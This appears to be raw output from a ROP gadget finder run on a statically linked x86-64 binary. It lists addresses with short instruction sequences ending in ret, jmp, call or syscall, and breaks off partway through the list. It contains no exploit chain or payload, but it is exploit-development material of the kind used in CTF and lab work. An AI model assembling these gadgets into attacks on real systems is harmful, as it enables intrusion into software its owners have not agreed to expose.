0x000000000046ca57 : add eax, 0x24a7c4 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046ca04 : add eax, 0x24a817 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046c4d7 : add eax, 0x24a844 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046c876 : add eax, 0x24a9a5 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046c831 : add eax, 0x24a9ea ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046c7ec : add eax, 0x24aa2f ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046c79d : add eax, 0x24aa7e ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000460ec8 : add eax, 0x255753 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000461277 : add eax, 0x2558a4 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000461229 : add eax, 0x2558f2 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046117a : add eax, 0x2559a1 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000046111e : add eax, 0x2559fd ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000460e7e : add eax, 0x255c9d ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000460e30 : add eax, 0x255ceb ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004609d7 : add eax, 0x255e44 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004582d2 : add eax, 0x263ba1 ; ret
0x000000000044dcd2 : add eax, 0x26c629 ; ret
0x000000000044fdd2 : add eax, 0x26cb51 ; ret
0x000000000045322f : add eax, 0x29480000 ; ret 0x349
0x0000000000425029 : add eax, 0x296dc2 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x0000000000424ee9 : add eax, 0x296f02 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x0000000000424d89 : add eax, 0x297062 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004200e7 : add eax, 0x299774 ; ret
0x00000000004200f1 : add eax, 0x29bc76 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000041a00d : add eax, 0x29f84e ; ret
0x0000000000419b08 : add eax, 0x29fce3 ; ret
0x0000000000419b1f : add eax, 0x29fce8 ; ret
0x0000000000419ae0 : add eax, 0x29fd03 ; ret
0x0000000000419ac0 : add eax, 0x29fd1b ; ret
0x00000000004199b6 : add eax, 0x29fe8d ; ret
0x00000000004199a6 : add eax, 0x29fe95 ; ret
0x0000000000419956 : add eax, 0x29fe9d ; ret
0x0000000000419946 : add eax, 0x29feb5 ; ret
0x0000000000418f72 : add eax, 0x2a01a9 ; ret
0x0000000000419fc1 : add eax, 0x2a1da6 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000419b35 : add eax, 0x2a225a ; ret
0x000000000041906d : add eax, 0x2a2ca2 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000401efe : add eax, 0x2b9 ; add byte ptr [rax - 0x75], cl ; pop rsp ; retf
0x00000000004b23bc : add eax, 0x3400e4e ; ret
0x000000000048505e : add eax, 0x38c48348 ; ret
0x000000000041d85e : add eax, 0x39480000 ; ret 0xf275
0x000000000042c15a : add eax, 0x40 ; add rax, rdi ; vzeroupper ; ret
0x0000000000444628 : add eax, 0x48054289 ; lea eax, [rdx + 8] ; ret
0x0000000000442e58 : add eax, 0x48054289 ; mov eax, edi ; ret
0x0000000000444b26 : add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x00000000004446a9 : add eax, 0x5428948 ; lea rax, [rdx + 0xc] ; ret
0x0000000000442e99 : add eax, 0x5428948 ; mov rax, rdi ; ret
0x0000000000485200 : add eax, 0x5b ; cmovne rax, rdx ; ret
0x00000000004a2e5d : add eax, 0x5c00000 ; add byte ptr [rax], al ; ret 5
0x0000000000471a2a : add eax, 0x5c415d5b ; ret
0x00000000004a2e6d : add eax, 0x5c80000 ; add byte ptr [rax], al ; retf 5
0x000000000042c17a : add eax, 0x60 ; add rax, rdi ; vzeroupper ; ret
0x00000000004250d9 : add eax, 0x6c52 ; cmove rax, rdx ; ret
0x0000000000424ce9 : add eax, 0x6d12 ; cmove rax, rdx ; ret
0x0000000000424d4d : add eax, 0x79ee ; je 0x424d22 ; ret
0x000000000042b487 : add eax, 0x83480000 ; ret 0x4910
0x000000000043edb1 : add eax, 0x83480000 ; ret 0xe910
0x000000000042b4b5 : add eax, 0x83480000 ; ret 0xeb10
0x000000000041d6fe : add eax, 0x83480000 ; retf 0x4901
0x000000000045f145 : add eax, 0x83ffffef ; ret
0x000000000044462b : add eax, 0x8428d48 ; ret
0x000000000040dc88 : add eax, 0x8944c689 ; ret 0xeab8
0x0000000000459753 : add eax, 0x89480000 ; ret 0x2948
0x0000000000491940 : add eax, 0x89490000 ; ret 0x8349
0x0000000000428cb8 : add eax, 0x894d0000 ; retf
0x00000000004abe65 : add eax, 0x92c80000 ; cmc ; call qword ptr [rdx]
0x00000000004abe79 : add eax, 0x92d40000 ; cmc ; call rsp
0x0000000000481148 : add eax, 0x940fc085 ; ret 0x3d
0x00000000004abf05 : add eax, 0x98f80000 ; cmc ; call rax
0x0000000000472939 : add eax, 0x9f2 ; cmove rax, rdx ; ret
0x0000000000473d49 : add eax, 0xa22 ; cmove rax, rdx ; ret
0x000000000042db7a : add eax, 0xc0310000 ; ret
0x00000000004446ad : add eax, 0xc428d48 ; ret
0x000000000044518d : add eax, 0xc478d48 ; ret
0x0000000000455d12 : add eax, 0xe9000000 ; ret
0x00000000004851e1 : add eax, 0xe9000000 ; retf 0xfff7
0x0000000000472909 : add eax, 0xee2 ; cmove rax, rdx ; ret
0x0000000000463518 : add eax, 0xf660004 ; outsd dx, dword ptr [rsi] ; ret 0x290f
0x0000000000463541 : add eax, 0xf660004 ; outsd dx, dword ptr [rsi] ; ret 0x3e8
0x000000000048d2ea : add eax, 0xf7148948 ; ret
0x0000000000435fe3 : add eax, 0xf7f0ff3 ; ret
0x000000000048f5fa : add eax, 0xffff50e9 ; push rbx ; ret
0x000000000044f145 : add eax, 1 ; push rax ; call rbx
0x0000000000474971 : add eax, 1 ; ret
0x0000000000474968 : add eax, 2 ; ret
0x0000000000474981 : add eax, 3 ; ret
0x000000000045b489 : add eax, dword ptr [0] ; ret
0x000000000044c72d : add eax, dword ptr [rax] ; add al, ch ; retf
0x000000000047b798 : add eax, dword ptr [rax] ; add bl, dh ; ret
0x0000000000489931 : add eax, dword ptr [rax] ; add byte ptr [rax + 0x74], ah ; adc dword ptr [rcx - 0x7d], ecx ; ret
0x0000000000489f8c : add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x000000000044d50e : add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; retf 0x8548
0x000000000041ccf8 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x000000000041b646 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x0000000000400fcb : add eax, dword ptr [rax] ; add byte ptr [rax - 0x75], cl ; push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x000000000041b7ca : add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004204ca : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000420690 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x000000000042b667 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043ef51 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b695 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000044fd24 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044afdc : add eax, dword ptr [rax] ; add byte ptr [rax], al ; pop rbp ; pop r12 ; jmp rax
0x00000000004749c3 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; ret
0x000000000044a4eb : add eax, dword ptr [rax] ; add byte ptr [rax], al ; syscall
0x000000000042b618 : add eax, dword ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000448d3c : add eax, dword ptr [rax] ; add byte ptr [rbx - 0x50f0fe40], al ; ret 0xf8e9
0x0000000000489b00 : add eax, dword ptr [rax] ; add byte ptr [rcx + 0x348b4cd8], cl ; ret 0xf41
0x0000000000461e3d : add eax, dword ptr [rax] ; add byte ptr [rcx + 0xf], al ; ret 0xc839
0x000000000044c6e5 : add eax, dword ptr [rax] ; add byte ptr [rcx - 0x77], al ; ret
0x000000000044c785 : add eax, dword ptr [rax] ; add byte ptr [rsi + 0x80], bh ; syscall
0x000000000047c6d6 : add eax, dword ptr [rax] ; add dh, dh ; ret 0x7403
0x000000000041b5c7 : add eax, dword ptr [rax] ; add dh, dh ; ret 0xf08
0x000000000046ebd4 : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x000000000046f31b : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x000000000046f389 : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x0000000000448a20 : add eax, dword ptr [rax] ; pop rbx ; ret
0x000000000047d39c : add eax, dword ptr [rbp - 0xb8] ; call rax
0x00000000004b4119 : add eax, dword ptr [rbx] ; or al, byte ptr [rcx] ; ret
0x00000000004008ba : add eax, dword ptr [rcx + 0xf] ; xchg eax, esp ; rol byte ptr [rcx + rcx*4 - 0x3e], 0x21 ; retf 0x8545
0x0000000000475b4a : add eax, dword ptr [rcx + rdx] ; ret
0x0000000000454be0 : add eax, dword ptr [rcx - 0x77] ; retf
0x000000000041065b : add eax, dword ptr [rcx] ; add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; ret
0x00000000004ad632 : add eax, dword ptr [rdi + 0xe] ; and byte ptr [rdx], al ; imul ecx, dword ptr [rsi], 0x18 ; ret
0x0000000000486dc3 : add eax, dword ptr [rdx + 8] ; call rax
0x00000000004b414d : add eax, dword ptr [rdx] ; cld ; ret
0x00000000004b4181 : add eax, dword ptr [rdx] ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004b20d2 : add eax, dword ptr [rsi + 0xe] ; and byte ptr [rsi + rcx + 0x18], bh ; ret
0x000000000047c416 : add eax, dword ptr [rsi] ; call rax
0x000000000048af26 : add eax, eax ; jmp rax
0x00000000004022a4 : add eax, ebp ; jmp rax
0x0000000000477b38 : add eax, ebp ; ret 0xfa85
0x00000000004874b0 : add eax, ebp ; retf 0xfff3
0x000000000047c737 : add eax, ebx ; call rax
0x000000000044dddc : add eax, ebx ; jmp rax
0x00000000004410d8 : add eax, ecx ; add rax, rdi ; vzeroupper ; ret
0x000000000046ebdb : add eax, ecx ; jmp rax
0x000000000042ba89 : add eax, ecx ; ret
0x000000000044143d : add eax, ecx ; sub rax, rdx ; vzeroupper ; ret
0x000000000042bfb6 : add eax, ecx ; vzeroupper ; ret
0x000000000042ba86 : add eax, edi ; add rax, rcx ; ret
0x000000000042bfb3 : add eax, edi ; add rax, rcx ; vzeroupper ; ret
0x000000000046f20b : add eax, edi ; jmp rax
0x000000000046f4df : add eax, edi ; mov rdx, r8 ; jmp 0x46f4b3
0x000000000042bcb4 : add eax, edi ; ret
0x00000000004853b0 : add eax, edi ; sub rax, r8 ; ret
0x00000000004414f5 : add eax, edi ; sub rax, rdx ; vzeroupper ; ret
0x000000000044749a : add eax, edi ; sub rax, rsi ; ret
0x000000000042c12a : add eax, edi ; vzeroupper ; ret
0x000000000040203a : add eax, edx ; jmp rax
0x00000000004413e6 : add eax, edx ; sub rax, rdi ; ret
0x000000000047466b : add eax, edx ; sub rax, rdi ; shr rax, 2 ; ret
0x00000000004489cc : add eax, esi ; jmp rax
0x0000000000418ccd : add eax, esi ; mov qword ptr [rdx + 8], rax ; xor eax, eax ; ret
0x000000000048c19d : add eax, esp ; jmp rax
0x0000000000463158 : add ebp, 0x30 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00000000004876f8 : add ebp, eax ; ret 0xf992
0x00000000004638eb : add ebp, eax ; retf
0x0000000000414281 : add ebp, ebp ; call 0x4004ac
0x00000000004a7a37 : add ebp, ebp ; retf
0x000000000047c412 : add ebx, 0x18 ; add rax, qword ptr [r14] ; call rax
0x000000000048a54a : add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x0000000000488780 : add ebx, dword ptr [rbp + 0x41] ; pop rsp ; pop r13 ; ret
0x00000000004173e1 : add ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00000000004b413e : add ebx, dword ptr [rbx + 3] ; ret
0x000000000044e9af : add ebx, dword ptr [rbx - 0x2d] ; loopne 0x44ea18 ; pop r12 ; ret
0x0000000000482871 : add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000042c89b : add ebx, eax ; nop dword ptr [rax] ; ret
0x00000000004361a3 : add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00000000004485d7 : add ecx, 0x40 ; cmp rdx, rcx ; jne 0x4485cc ; ret
0x0000000000442e45 : add ecx, dword ptr [r9 - 0x76b7fcbe] ; clc ; ret
0x0000000000457c0d : add ecx, dword ptr [rax + 0x39] ; ret
0x0000000000455cbd : add ecx, dword ptr [rax + 0x39] ; retf
0x000000000040e17e : add ecx, dword ptr [rax + 1] ; fmul dword ptr [rax - 0x7d] ; ret 0x4801
0x0000000000451a6a : add ecx, dword ptr [rax - 0x77] ; and al, 0x50 ; call 0x44dd48
0x0000000000442e49 : add ecx, dword ptr [rax - 0x77] ; clc ; ret
0x000000000047e867 : add ecx, dword ptr [rax - 0x77] ; mov rax, rcx ; ret
0x0000000000450623 : add ecx, dword ptr [rax - 0x77] ; or byte ptr [r15], 0x8e ; ret 1
0x0000000000434fc4 : add ecx, dword ptr [rax - 0x77] ; ror dword ptr [rax + 0x29], 1 ; retf 0x8148
0x000000000048bc5f : add ecx, dword ptr [rax - 0x7d] ; ret
0x000000000040eb71 : add ecx, dword ptr [rbp + rcx*4 + 0x64] ; ret
0x0000000000480e2a : add ecx, dword ptr [rbp - 0x77] ; dec byte ptr [rax - 0x7d] ; ret
0x0000000000483340 : add ecx, dword ptr [rbp - 0x77] ; ret 0x8d48
0x0000000000435f12 : add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x00000000004b410a : add ecx, dword ptr [rbx + 3] ; ret
0x0000000000444ac4 : add ecx, dword ptr [rcx + 0x357890f] ; ret
0x0000000000442e46 : add ecx, dword ptr [rcx - 0x76b7fcbe] ; clc ; ret
0x00000000004496df : add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000044973d : add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x00000000004ac231 : add ecx, dword ptr [rsi + rcx - 0x50] ; add al, byte ptr [rdx] ; ret 0xb00e
0x0000000000465f89 : add ecx, eax ; mov eax, r9d ; ret
0x0000000000454245 : add ecx, ebp ; retf 0xfff6
0x000000000042e1ab : add ecx, ebx ; jmp r9
0x000000000042cb42 : add ecx, ebx ; jmp rcx
0x00000000004489f4 : add ecx, esi ; jmp rcx
0x000000000048e1ae : add edi, dword ptr [rax + 4] ; jne 0x48e1d9 ; ret
0x0000000000419ae1 : add edi, ebp ; sub dword ptr [rax], eax ; ret
0x000000000045ac64 : add edi, ebx ; jmp rdi
0x000000000042e1a8 : add edi, edx ; add r9, r11 ; jmp r9
0x000000000040d63c : add edi, edx ; jmp rdi
0x00000000004741fb : add edi, esp ; call 0x400494
0x00000000004b2fa9 : add edi, esp ; jmp rdx
0x0000000000487274 : add edx, eax ; jmp 0x487282
0x00000000004835a2 : add edx, eax ; mov rax, rdx ; pop rbx ; ret
0x0000000000412b10 : add edx, ecx ; jmp 0x412b22
0x0000000000494cbd : add edx, edi ; jmp rax
0x000000000040d353 : add edx, edi ; jmp rdx
0x0000000000468f28 : add edx, esp ; call qword ptr [r10 + rax*8]
0x0000000000454bda : add esi, dword ptr [rdi + 0xf] ; mov dh, 0x4e ; add eax, dword ptr [rcx - 0x77] ; retf
0x0000000000459016 : add esi, dword ptr [rdi + rax - 0xd] ; ret
0x000000000045a765 : add esi, eax ; jmp rsi
0x00000000004360c3 : add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00000000004477f5 : add esi, ebx ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000449efc : add esi, ebx ; ret
0x000000000041f5f0 : add esi, ebx ; stosq qword ptr [rdi], rax ; pop rbx ; ret
0x00000000004ab40d : add esi, edi ; call rsp
0x0000000000448afe : add esi, edi ; int1 ; pop rbx ; mov eax, eax ; ret
0x000000000042e1a5 : add esi, edx ; add rdi, rdx ; add r9, r11 ; jmp r9
0x0000000000416f11 : add esp, 0x10 ; pop rbx ; jmp rax
0x0000000000411111 : add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044a52f : add esp, 0x10 ; pop rbx ; ret
0x0000000000412815 : add esp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044739d : add esp, 0x100 ; sub rax, rdx ; ret
0x0000000000482748 : add esp, 0x110 ; pop rbx ; ret
0x000000000040dcce : add esp, 0x118 ; ret
0x000000000045b7ba : add esp, 0x148 ; ret
0x000000000041aa29 : add esp, 0x18 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x000000000041fcdb : add esp, 0x18 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00000000004202f6 : add esp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x000000000044dafa : add esp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004121a5 : add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000045b572 : add esp, 0x18 ; ret
0x0000000000423db0 : add esp, 0x20 ; call 0x410845
0x0000000000422150 : add esp, 0x20 ; call 0x410849
0x0000000000417a1d : add esp, 0x20 ; mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x00000000004175fd : add esp, 0x20 ; pop rbx ; jmp rax
0x0000000000417a56 : add esp, 0x20 ; pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x00000000004827c9 : add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041736f : add esp, 0x20 ; pop rbx ; ret
0x0000000000449522 : add esp, 0x28 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000449eca : add esp, 0x28 ; ret
0x000000000044feb8 : add esp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048499f : add esp, 0x30 ; pop rbx ; ret
0x000000000048ad16 : add esp, 0x38 ; pop rbx ; pop r14 ; ret
0x000000000040db84 : add esp, 0x38 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000416a1e : add esp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000475a01 : add esp, 0x38 ; ret
0x00000000004885ac : add esp, 0x40 ; pop rbx ; ret
0x0000000000481cdc : add esp, 0x48 ; jmp qword ptr [rax]
0x0000000000449ba2 : add esp, 0x48 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000488693 : add esp, 0x50 ; pop rbx ; ret
0x0000000000481c6a : add esp, 0x58 ; jmp qword ptr [rax]
0x000000000044a0fa : add esp, 0x58 ; ret
0x0000000000449fec : add esp, 0x68 ; ret
0x0000000000473e64 : add esp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044a37f : add esp, 0x78 ; ret
0x00000000004688ee : add esp, 0x80 ; mov eax, edx ; pop rbx ; ret
0x00000000004754e3 : add esp, 0x80 ; pop rbx ; ret
0x00000000004162e8 : add esp, 0x80 ; ret
0x000000000044c4cd : add esp, 0x88 ; pop rbx ; pop rbp ; ret
0x0000000000400e82 : add esp, 0x88 ; pop rbx ; ret
0x00000000004015ff : add esp, 0x98 ; ret
0x0000000000475603 : add esp, 0xa8 ; pop rbx ; pop rbp ; ret
0x0000000000458426 : add esp, 0xb8 ; pop rbx ; pop r12 ; ret
0x0000000000410407 : add esp, 0xd0 ; pop rbx ; ret
0x0000000000410596 : add esp, 0xd8 ; pop rbx ; pop rbp ; ret
0x0000000000410064 : add esp, 0xd8 ; ret
0x000000000041251f : add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000047fd3b : add esp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x000000000041092e : add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000044bb10 : add esp, 8 ; mov rax, rbp ; pop rbx ; pop rbp ; jmp rax
0x000000000044ad4c : add esp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x0000000000416fc9 : add esp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00000000004884e9 : add esp, 8 ; movzx eax, al ; neg eax ; ret
0x0000000000413fd4 : add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000401c93 : add esp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400413 : add esp, 8 ; ret
0x0000000000424179 : add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00000000004a912b : add esp, dword ptr [rbx + 0x74] ; or dword ptr [rdx + 2], edx ; rcr dword ptr [rcx], cl ; retf 0xbb9a
0x0000000000455fca : add qword ptr [rax + 0x39], rcx ; retf
0x0000000000454b9e : add qword ptr [rcx - 0x77], r8 ; retf
0x00000000004361a2 : add r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x0000000000436132 : add r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x00000000004360c2 : add r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x00000000004741fa : add r15, r12 ; call 0x400495
0x000000000042b694 : add r8, qword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000454bdf : add r8, qword ptr [rcx - 0x77] ; retf
0x000000000042e1aa : add r9, r11 ; jmp r9
0x00000000004a8ee9 : add r9b, bl ; retf 0xea91
0x0000000000457bee : add r9b, byte ptr [rax + 0x39] ; ret
0x0000000000457c0c : add r9d, dword ptr [rax + 0x39] ; ret
0x0000000000465f88 : add r9d, eax ; mov eax, r9d ; ret
0x0000000000474970 : add rax, 1 ; ret
0x0000000000474967 : add rax, 2 ; ret
0x0000000000474980 : add rax, 3 ; ret
0x000000000045b488 : add rax, qword ptr [0] ; ret
0x000000000047c415 : add rax, qword ptr [r14] ; call rax
0x000000000047d39b : add rax, qword ptr [rbp - 0xb8] ; call rax
0x0000000000486dc2 : add rax, qword ptr [rdx + 8] ; call rax
0x000000000045b487 : add rax, qword ptr fs:[0] ; ret
0x000000000047c736 : add rax, r11 ; call rax
0x000000000048c19c : add rax, r12 ; jmp rax
0x00000000004022a3 : add rax, r13 ; jmp rax
0x000000000048ca9d : add rax, r14 ; jmp rax
0x000000000048b14b : add rax, r15 ; jmp rax
0x000000000048af25 : add rax, r8 ; jmp rax
0x000000000048c6d5 : add rax, r9 ; jmp rax
0x000000000044de53 : add rax, rbp ; jmp rax
0x000000000044dddb : add rax, rbx ; jmp rax
0x00000000004410d7 : add rax, rcx ; add rax, rdi ; vzeroupper ; ret
0x000000000046ebda : add rax, rcx ; jmp rax
0x000000000042ba88 : add rax, rcx ; ret
0x000000000044143c : add rax, rcx ; sub rax, rdx ; vzeroupper ; ret
0x000000000042bfb5 : add rax, rcx ; vzeroupper ; ret
0x000000000042ba85 : add rax, rdi ; add rax, rcx ; ret
0x000000000042bfb2 : add rax, rdi ; add rax, rcx ; vzeroupper ; ret
0x000000000046f20a : add rax, rdi ; jmp rax
0x000000000042bcb3 : add rax, rdi ; ret
0x00000000004853af : add rax, rdi ; sub rax, r8 ; ret
0x00000000004414f4 : add rax, rdi ; sub rax, rdx ; vzeroupper ; ret
0x0000000000447499 : add rax, rdi ; sub rax, rsi ; ret
0x000000000042c129 : add rax, rdi ; vzeroupper ; ret
0x0000000000402039 : add rax, rdx ; jmp rax
0x00000000004413e5 : add rax, rdx ; sub rax, rdi ; ret
0x00000000004489cb : add rax, rsi ; jmp rax
0x0000000000414280 : add rbp, r13 ; call 0x4004ad
0x000000000047c411 : add rbx, 0x18 ; add rax, qword ptr [r14] ; call rax
0x0000000000455fe9 : add rcx, qword ptr [rax + 0x39] ; retf
0x000000000042cb41 : add rcx, r11 ; jmp rcx
0x00000000004489f3 : add rcx, rsi ; jmp rcx
0x000000000040d63b : add rdi, r10 ; jmp rdi
0x000000000045ac63 : add rdi, r11 ; jmp rdi
0x000000000042e1a7 : add rdi, rdx ; add r9, r11 ; jmp r9
0x0000000000468f27 : add rdx, r12 ; call qword ptr [r10 + rax*8]
0x00000000004835a1 : add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x0000000000487273 : add rdx, rax ; jmp 0x487283
0x0000000000412b0f : add rdx, rcx ; jmp 0x412b23
0x000000000040d352 : add rdx, rdi ; jmp rdx
0x000000000045a764 : add rsi, r8 ; jmp rsi
0x0000000000416f10 : add rsp, 0x10 ; pop rbx ; jmp rax
0x0000000000411110 : add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044a52e : add rsp, 0x10 ; pop rbx ; ret
0x0000000000482747 : add rsp, 0x110 ; pop rbx ; ret
0x000000000040dccd : add rsp, 0x118 ; ret
0x000000000045b7b9 : add rsp, 0x148 ; ret
0x000000000041aa28 : add rsp, 0x18 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x000000000041fcda : add rsp, 0x18 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00000000004202f5 : add rsp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x00000000004121a4 : add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000045b571 : add rsp, 0x18 ; ret
0x0000000000423daf : add rsp, 0x20 ; call 0x410846
0x0000000000417a1c : add rsp, 0x20 ; mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x00000000004175fc : add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000417a55 : add rsp, 0x20 ; pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x00000000004827c8 : add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041736e : add rsp, 0x20 ; pop rbx ; ret
0x0000000000449ec9 : add rsp, 0x28 ; ret
0x000000000044feb7 : add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048499e : add rsp, 0x30 ; pop rbx ; ret
0x000000000048ad15 : add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x0000000000416a1d : add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000475a00 : add rsp, 0x38 ; ret
0x00000000004885ab : add rsp, 0x40 ; pop rbx ; ret
0x0000000000481cdb : add rsp, 0x48 ; jmp qword ptr [rax]
0x0000000000488692 : add rsp, 0x50 ; pop rbx ; ret
0x0000000000481c69 : add rsp, 0x58 ; jmp qword ptr [rax]
0x000000000044a0f9 : add rsp, 0x58 ; ret
0x0000000000449feb : add rsp, 0x68 ; ret
0x0000000000473e63 : add rsp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044a37e : add rsp, 0x78 ; ret
0x00000000004754e2 : add rsp, 0x80 ; pop rbx ; ret
0x00000000004162e7 : add rsp, 0x80 ; ret
0x000000000044c4cc : add rsp, 0x88 ; pop rbx ; pop rbp ; ret
0x0000000000400e81 : add rsp, 0x88 ; pop rbx ; ret
0x00000000004015fe : add rsp, 0x98 ; ret
0x0000000000475602 : add rsp, 0xa8 ; pop rbx ; pop rbp ; ret
0x0000000000410406 : add rsp, 0xd0 ; pop rbx ; ret
0x0000000000410595 : add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
0x0000000000410063 : add rsp, 0xd8 ; ret
0x000000000041251e : add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000047fd3a : add rsp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x000000000041092d : add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000044bb0f : add rsp, 8 ; mov rax, rbp ; pop rbx ; pop rbp ; jmp rax
0x000000000044ad4b : add rsp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x0000000000416fc8 : add rsp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00000000004884e8 : add rsp, 8 ; movzx eax, al ; neg eax ; ret
0x0000000000401c92 : add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400412 : add rsp, 8 ; ret
0x0000000000424178 : add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000424fe7 : add word ptr [rax], ax ; and ch, 2 ; cmovne rax, rdx ; ret
0x000000000048547a : add word ptr [rdx + rax*2], 1 ; ret
0x0000000000494cec : and ah, bh ; stc ; jmp qword ptr [rax + 0x20fff9fd]
0x0000000000494c98 : and ah, dh ; stc ; jmp qword ptr [rax + 0x20fff9f5]
0x00000000004743e2 : and al, 0 ; jmp 0x4741d4
